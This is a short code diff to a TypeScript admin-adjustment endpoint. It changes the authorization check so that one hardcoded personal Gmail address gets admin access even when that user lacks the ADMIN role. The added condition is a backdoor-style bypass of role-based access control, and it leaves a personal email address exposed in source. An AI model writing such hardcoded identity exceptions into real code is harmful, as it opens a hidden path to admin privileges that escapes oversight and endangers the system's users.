@@ -67,10 +67,10 @@ export async function handleAdminAdjust(req: any, res: any) {
         const caller = await verifyUser(req.headers.authorization);
         const adminClient = getAdminClient();
 
-        // Verify caller is ADMIN
+        // Verify caller is ADMIN or the designated admin email
         const { data: callerData } = await adminClient
             .from('users').select('role').eq('id', caller.id).single();
-        if (!callerData || callerData.role !== 'ADMIN') {
+        if (!callerData || (callerData.role !== 'ADMIN' && caller.email !== 'caophi.nasani@gmail.com')) {
             return res.status(403).json({ error: 'FORBIDDEN: Chỉ Admin mới có quyền này' });
         }
 
